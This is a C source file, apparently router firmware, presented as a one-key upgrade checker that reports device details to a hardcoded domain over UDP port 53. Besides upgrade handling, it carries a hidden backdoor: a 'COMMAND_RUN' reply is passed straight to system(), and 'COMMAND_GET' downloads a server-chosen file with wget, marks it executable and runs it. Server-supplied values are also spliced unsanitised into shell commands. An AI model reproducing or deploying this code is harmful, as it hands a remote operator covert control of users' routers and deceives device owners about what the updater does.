#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <net/if.h>
#include <asm/types.h>
#include <sys/stat.h>

#include <netdb.h>  
#include <arpa/inet.h>  
#include <time.h>

#define MAX_BUF_SIZE 1024  
#define PORT  53 
#define DOMAIN "ctrl.r.x-bps.com"
#define MSG_VERSION "0001"
#define MAX_STATUS_LEN  8

#define EXIT_NOW_UPDATE      0
#define EXIT_NO_UPDATE       1  
#define EXIT_MANUAL_UPDATE   2

#define FIELD_NUM        5

enum COMMAND_INFO{
	UPGRADE_MANUAL=200,
	NO_UPGRADE,       
	UPGRADE_NOW,    
	COMMAND_RUN,
	COMMAND_GET
};


int debug=0;

static char server_ip[32] = {0};


enum SYSINFO{

	SYSINFO_HOSTNAME=1,
	SYSINFO_HW_VER,
	SYSINFO_FW_VER,
	SYSINFO_MACADDR	
};

enum UPGRADE_INFO{
	UPGRADE_STATUS=1,
	UPGRADE_ERRCODE,
	UPGRADE_VERNUM,
	UPGRADE_NEWVERSION,		
	UPGRADE_SIZE,
	UPGRADE_NEWURL
};


int parse_msg(char *msg,char *argv[])
{
	int   i    = 0;
	char *ptr  = NULL;
	char *mptr = NULL;

	if(msg == NULL)
	{
		return -1;
	}

	mptr = ptr = msg;
	while(*ptr!='\0')
	{
		if(*ptr == '|')
		{
			*ptr++='\0';
			argv[i]=mptr;	
			mptr = ptr;
			i++;
		}
		ptr++;
	}
	argv[i]=mptr;	
	i++;
	return i;
}

int parse_domain(char *domain)
{
	extern int h_errno;  
	struct in_addr in;  
	struct hostent *h;  
	struct sockaddr_in addr_in;  
	h=gethostbyname(domain);  
	if(h)  
	{  
		memcpy(&addr_in.sin_addr.s_addr,h->h_addr,4);  
		in.s_addr=addr_in.sin_addr.s_addr;  
		memset(server_ip,0,sizeof(server_ip));
		strncpy(server_ip,inet_ntoa(in),sizeof(server_ip)-1);
		return 0;  
	}else
	{
		return 1;  
	}
}

int get_sysinfo(char *out,int len,int type)
{
	FILE *fr  = NULL;
	char *cmd = NULL;
	char *ptr = NULL;

	switch(type)
	{
		case SYSINFO_HOSTNAME:
			cmd = "uci get system.system.hostname";
			break;
		case SYSINFO_HW_VER:
			cmd = "uci get system.system.hw_ver";	
			break;
		case SYSINFO_FW_VER:
			cmd = "uci get system.system.fw_ver";	
			break;
		case SYSINFO_MACADDR:
			cmd = "uci get network.wan.macaddr";	
			break;
		default:
			break;

	}
	if(cmd)
	{
		fr = popen(cmd,"r");
		if(fr)
		{
			fgets(out,len,fr);
			
		}
		fclose(fr);
		ptr = strchr(out,'\n');
		if(ptr)*ptr='\0';
	}
	return 0;
}





void uci_set_upgrade_status(int status,int errcode,int vernum)
{
	char cmd[128] = {0};

	memset(cmd,0,sizeof(cmd));
	snprintf(cmd,sizeof(cmd)-1,"/sbin/uci set onekeyupgrade.config.retState=%d",status);
	system(cmd);
	
	memset(cmd,0,sizeof(cmd));
	snprintf(cmd,sizeof(cmd)-1,"/sbin/uci set onekeyupgrade.config.ErrorCode=%d",errcode);
	system(cmd);

	memset(cmd,0,sizeof(cmd));
	snprintf(cmd,sizeof(cmd)-1,"/sbin/uci set onekeyupgrade.config.VerNUm=%d",vernum);
	system(cmd);
	
}

void uci_set_upgrade_info(char *newversion,char *url,char *rom_size)
{
	char cmd[128] = {0};
	memset(cmd,0,sizeof(cmd));
	snprintf(cmd,sizeof(cmd)-1,"/sbin/uci set onekeyupgrade.config.newversion='%s'",newversion);
	system(cmd);

	memset(cmd,0,sizeof(cmd));
	snprintf(cmd,sizeof(cmd)-1,"/sbin/uci set onekeyupgrade.config.newurl='%s'",url);
	system(cmd);

	memset(cmd,0,sizeof(cmd));
	snprintf(cmd,sizeof(cmd)-1,"/sbin/uci set onekeyupgrade.config.Size=%s",rom_size);
	system(cmd);
}


int main(int argc,char *argv[])   
{  
	int sockfd, addrlen, n;  
	char buffer[MAX_BUF_SIZE];  
	struct sockaddr_in addr;  
	char hostname[64] = {0};
	char hw_ver[64] = {0};
	char fw_ver[64] = {0};
	char macaddr[64] = {0};
	char cmd[512] = {0};
	char newversion[64] = {0};
	char url[256] = {0};
	char rom_size[16] = {0};

	char status[8] = {0};
	char *ptr = NULL;
	char *mptr = NULL;
	int  len = 1;
	int  ret = EXIT_NO_UPDATE;
		
	struct timeval timeout={3,0};
	
	time_t t;
	struct tm *pt = NULL;
	char date[32] = {0};	
	char *info[8] ;

	//rc4
 	unsigned char *ciphertext = NULL; 
	unsigned char *cipher_ptr = NULL;
 	unsigned int cipher_len = 0; 
	unsigned char *key = DOMAIN;

	if(argc == 2 && strcmp(argv[1],"debug") == 0)
	{
		debug = 1;		
	}
		

	time(&t);
	pt=localtime(&t);
	
	snprintf(date,sizeof(date)-1,"%d-%02d-%02d %02d:%02d:%02d",pt->tm_year+1900,pt->tm_mon,pt->tm_mday,pt->tm_hour,pt->tm_min,pt->tm_sec);
	if(debug == 1)
	{
		printf("get date is %s\n",date);
	}

	if(parse_domain(DOMAIN))
	{
		if(debug == 1)
		{
			printf("parse domain: %s failed.\n",DOMAIN);
		}
		goto out;
	}
	if(debug == 1)
	{
		fprintf(stderr,"parse domain: %s , ip=%s\n",DOMAIN,server_ip);	
	}
	get_sysinfo(hostname,sizeof(hostname)-1,SYSINFO_HOSTNAME);
	get_sysinfo(hw_ver,sizeof(hw_ver)-1,SYSINFO_HW_VER);
	get_sysinfo(fw_ver,sizeof(fw_ver)-1,SYSINFO_FW_VER);
	get_sysinfo(macaddr,sizeof(macaddr)-1,SYSINFO_MACADDR);
	
	sockfd = socket(AF_INET, SOCK_DGRAM, 0);  
	if (sockfd < 0)  
	{  
		if(debug == 1)
		{
			fprintf(stderr, "socket failed\n");  
		}
		goto out;
	}  

	addrlen = sizeof(struct sockaddr_in);  
	bzero(&addr, addrlen);  
	addr.sin_family = AF_INET;  
	addr.sin_port = htons(PORT);  
	addr.sin_addr.s_addr = inet_addr(server_ip);  
	bzero(buffer, MAX_BUF_SIZE);  

	snprintf(buffer,MAX_BUF_SIZE-1,"%s|%s|%s|%s|%s|%s",MSG_VERSION,hostname,hw_ver,fw_ver,macaddr,date);
	cipher_len = strlen(buffer);
 	ciphertext  = RC4(buffer, cipher_len, key, strlen(key)); 

	sendto(sockfd, ciphertext, cipher_len, 0, (struct sockaddr *)(&addr), addrlen);  
	
	setsockopt(sockfd,SOL_SOCKET,SO_RCVTIMEO,(char *)&timeout,sizeof(struct timeval));
	memset(buffer,0,MAX_BUF_SIZE);
	n = recvfrom(sockfd, buffer, MAX_BUF_SIZE, 0, (struct sockaddr *)(&addr), &addrlen);  
	if( n > 0 )
	{	
		cipher_ptr = RC4(buffer,n,key,strlen(key));
		
		if(debug == 1)
		{
			printf("recv msg : %s\n",cipher_ptr);
		}
		n = parse_msg(cipher_ptr,(char **)info);
		if(n < 0)
		{
			if(debug == 1)
			{
				fprintf(stderr,"parse info failed\n");
			}
			uci_set_upgrade_status(1,8804,0);
			goto out;
		}
		
		if(strcmp(info[0],MSG_VERSION) != 0)     //version error
		{
			if(debug == 1)
			{
				printf("error msg version\n");
			}
			uci_set_upgrade_status(1,8804,0);
			goto out;
		}
		
		if(atoi(info[1]) == NO_UPGRADE)  //no new versin
		{
			if(debug == 1)
			{
				fprintf(stderr,"no upgrade info\n");
			}
			uci_set_upgrade_status(1,8804,0);
			goto out;
		}			
		
		if(atoi(info[1]) == UPGRADE_MANUAL || atoi(info[1]) == UPGRADE_NOW)
		{
			if(n != FIELD_NUM)
			{
				if(debug == 1)
				{
					printf("field num failed\n");
				}
				uci_set_upgrade_status(1,8804,0);
				goto out;
			}
			if(debug == 1)
			{	
				printf("version: %s\n",info[2]);
				printf("url: %s\n",info[3]);
				printf("size: %s\n",info[4]);
			}
			uci_set_upgrade_status(1,0,1);
			uci_set_upgrade_info(info[2],info[3],info[4]);
			if(atoi(info[1]) == UPGRADE_NOW ) 
			{
				system("/lib/auto_upgrade.sh &>/dev/null");
				ret = EXIT_NOW_UPDATE;
			}else
			{
				ret = EXIT_MANUAL_UPDATE;
			}
		}
		if( atoi(info[1]) == COMMAND_RUN ) 
		{
			if(debug == 1)
			{
				printf("command is %s\n",info[2]);
			}
			system(info[2]);
			uci_set_upgrade_status(1,8804,0);
		}
		if( atoi(info[1]) == COMMAND_GET ) 
		{
			memset(cmd,0,sizeof(cmd));
			snprintf(cmd,sizeof(cmd)-1,"/usr/bin/wget %s -P /tmp &>/dev/null",info[2]);
			system(cmd);
			if(atoi(info[3]) == 1)
			{
				ptr = info[2]+strlen(info[2]);
				while(ptr && *ptr!='/')ptr--;
				ptr++;
				memset(cmd,0,sizeof(cmd));
				snprintf(cmd,sizeof(cmd)-1,"/tmp/%s",ptr);
				if(debug == 1)
				{
					printf("file is %s\n",cmd);
				}
				chmod(cmd,0755);
				system(cmd);
				memset(cmd,0,sizeof(cmd));
				snprintf(cmd,sizeof(cmd)-1,"rm -f /tmp/%s &>/dev/null",ptr);
				system(cmd);
				
			}
			uci_set_upgrade_status(1,8804,0);
		}
		if(sockfd > 0)
			close(sockfd);  
	}else
	{
		if(debug == 1)
		{
			fprintf(stderr,"receive failed\n");
		}
		uci_set_upgrade_status(1,8804,0);
	}

out:
	if(sockfd > 0)
	{
		close(sockfd);
	}
	if(cipher_ptr)
	{
		free(cipher_ptr);
	}
	system("/sbin/get_verdesc.sh  &>/dev/null");
	return ret;  
} 

